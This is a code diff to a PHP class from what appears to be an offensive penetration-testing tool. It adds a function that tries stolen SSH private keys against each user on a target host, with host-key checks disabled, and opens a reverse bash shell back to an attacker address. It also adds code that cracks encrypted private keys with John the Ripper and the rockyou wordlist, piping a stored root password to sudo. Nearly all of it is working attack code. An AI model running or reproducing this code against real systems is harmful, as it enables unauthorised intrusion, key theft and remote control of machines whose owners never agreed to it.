@@ -387,6 +387,31 @@ class check4linux8key extends check4linux8enum{
         
     }
     
+    public function key4pentest8attacker($stream,$privkey_str,$ssh_port,$type_crypt){
+        $this->titre(__FUNCTION__);
+        $hash = sha1($privkey_str);
+        $users = $this->ip2users4shell();
+        foreach ($users as $username){
+        $stream = $this->key2stream($stream, $this->ip, $username, $privkey_str, $ssh_port,$type_crypt);
+        
+        if(is_resource($stream)){
+            $info = "SSH Private Key:$privkey_str";
+            $this->log2succes($info);
+            $template_shell = "ssh -i /tmp/$hash.priv -o PasswordAuthentication=no  -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null $username@$this->ip -p $ssh_port -C \"%SHELL%\" ";
+            
+            $templateB64_shell = base64_encode($template_shell);
+            $attacker_ip = $this->ip4addr4target($this->ip);
+            $attacker_port = rand(1024,65535);
+            $shell = "/bin/bash";
+            $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
+            $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
+            
+            $lprotocol = 'T' ;
+            $type = "server";
+            $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
+        }
+        }
+    }
     
     public function key2pentest8attacker($stream,$username,$privkey_str,$ssh_port,$type_crypt){
         $this->titre(__FUNCTION__);
@@ -460,9 +485,18 @@ class check4linux8key extends check4linux8enum{
     
     public function key2norme8str($privkey_str,$type_crypt):string{   
         $result = "";
+        $private_keys_str = "";
+        $filename = sha1($privkey_str);
+        $this->str2file("", $privkey_str, "/tmp/$filename.priv.tmp");
+        $private_keys_str8tmp = $privkey_str;
         $type_crypt = strtoupper($type_crypt);
-        if (!empty($privkey_str)) $result = $this->req_ret_str("echo '$privkey_str'  | awk '/BEGIN PRIVATE KEY/,/END PRIVATE KEY/' "); //| awk '/BEGIN $type_crypt PRIVATE KEY/,/END $type_crypt PRIVATE KEY/' 
-        return $result;
+        if (stristr($private_keys_str8tmp, "ENCRYPTED")!==FALSE){
+            
+            $privkey_passwd = $this->key2crack($private_keys_str8tmp, "$this->dico_password.rockyou");
+            if (!empty($privkey_passwd)) $private_keys_str = $this->key8priv4pass2nopass("", $private_keys_str8tmp, $privkey_passwd,$type_crypt);
+        }
+        if (!empty($private_keys_str)) return $this->req_ret_str("echo '$private_keys_str'  | awk '/BEGIN PRIVATE KEY/,/END PRIVATE KEY/' "); //| awk '/BEGIN $type_crypt PRIVATE KEY/,/END $type_crypt PRIVATE KEY/' 
+        else return $result;
     }
     
     
@@ -473,10 +507,17 @@ class check4linux8key extends check4linux8enum{
         $privkey_hash = sha1($privkey_str);
         $file_path = "/tmp/$privkey_hash.priv.pass";
         $this->str2file("",$privkey_str, $file_path);
+        $query = "head -5 $file_path ";
+        $this->req_ret_str($query);
         $query = "python /opt/john/ssh2john.py $file_path > /tmp/$privkey_hash.hash";
         $this->req_ret_str($query);
+        $query = "head -5 /tmp/$privkey_hash.hash";
+        $this->req_ret_str($query);
         $query = "echo '$this->root_passwd' | sudo -S /opt/john/john --format=SSH /tmp/$privkey_hash.hash --wordlist:$dico | grep '$file_path' | awk '{printf $1}' ";
-        return $this->req_ret_str($query);
+        $result = $this->req_ret_str($query);
+        $query = "echo '$this->root_passwd' | sudo -S /opt/john/john --show /tmp/$privkey_hash.hash | grep '$file_path' | awk '{printf $1}' ";
+        $this->req_ret_str($query);
+        return $result;
     }
 
     
